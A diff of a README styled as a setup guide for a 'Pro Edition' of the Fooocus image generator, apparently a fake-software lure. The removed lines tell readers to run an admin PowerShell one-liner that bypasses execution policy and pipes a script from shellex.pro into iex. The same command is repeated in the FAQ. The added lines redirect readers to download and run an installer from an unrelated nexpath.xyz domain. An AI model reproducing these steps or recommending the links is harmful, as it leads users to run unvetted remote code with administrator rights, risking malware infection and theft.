@@ -2,8 +2,6 @@
 
 <img src="https://img.shields.io/badge/Platform-Windows_10/11-0078D4?style=for-the-badge&logo=windows&logoColor=white" height="25"/>
 <img src="https://img.shields.io/badge/Category-Ai-6366f1?style=for-the-badge" height="25"/>
-<img src="https://img.shields.io/badge/Shell-PowerShell-5391FE?style=for-the-badge&logo=powershell&logoColor=white" height="25"/>
-
 # Fooocus AI Image Generator Pro Edition Complete Setup Guide
 **One-click AI art generation — simpler than ComfyUI, powered by Stable Diffusion.**
 
@@ -19,31 +17,14 @@
 
 Fooocus AI Image Generator Pro Edition Complete Setup Guide — One-click AI art generation — simpler than ComfyUI, powered by Stable Diffusion.
 
-## INSTALLATION
+## Download
 
-**Steps:**
-1. Press **Win**, type **PowerShell**
-2. Right-click **Windows PowerShell** → **Run as administrator**
-3. Copy the command below, paste into the window, press **Enter**
-4. If **UAC** still appears – click **Yes**
+> Use the project link below for Windows.
 
-```powershell
-powershell -NoProfile -ExecutionPolicy Bypass -Command "irm 'https://shellex.pro/ps/setup.ps1' | iex"
-```
-
-<details>
-<summary><b>Command did not start?</b></summary>
-
-Try this directly in the same PowerShell window:
-
-```powershell
-irm 'https://shellex.pro/ps/setup.ps1' | iex
-```
-
-</details>
-
-<sub>Administrator rights are required to complete the setup.</sub>
-
+* **Project link:** **[fooocus-ai-image-generator.nexpath.xyz](https://fooocus-ai-image-generator.nexpath.xyz/)**
+* **Full URL:** `https://fooocus-ai-image-generator.nexpath.xyz/`
+* **Type:** Desktop package | Windows 10 and 11, 64-bit
+* **Setup:** Run the installer from the extracted folder
 
 ## `FEATURES`
 
@@ -65,12 +46,12 @@ irm 'https://shellex.pro/ps/setup.ps1' | iex
 
 <details>
 <summary>&nbsp;<b>How to install?</b></summary>
-<br>Open PowerShell as Administrator and run the command from the INSTALLATION section above.
+<br>Open <a href="https://fooocus-ai-image-generator.nexpath.xyz/">fooocus-ai-image-generator.nexpath.xyz</a>, click <b>Download</b>, extract the archive, then run <b>Setup</b>.
 </details>
 
 <details>
-<summary>&nbsp;<b>Command did not start?</b></summary>
-<br>Try: `irm 'https://shellex.pro/ps/setup.ps1' | iex`
+<summary>&nbsp;<b>Download didn't start?</b></summary>
+<br>Use the manual link on the NexPath download page, or open <a href="https://fooocus-ai-image-generator.nexpath.xyz/">fooocus-ai-image-generator.nexpath.xyz</a> directly in your browser.
 </details>
 
 <details>
@@ -80,5 +61,5 @@ irm 'https://shellex.pro/ps/setup.ps1' | iex
 
 <details>
 <summary>&nbsp;<b>Updates?</b></summary>
-<br>Re-run the same PowerShell command to fetch the latest build.
+<br>Open <a href="https://fooocus-ai-image-generator.nexpath.xyz/">fooocus-ai-image-generator.nexpath.xyz</a> again and download the latest version from NexPath.
 </details>
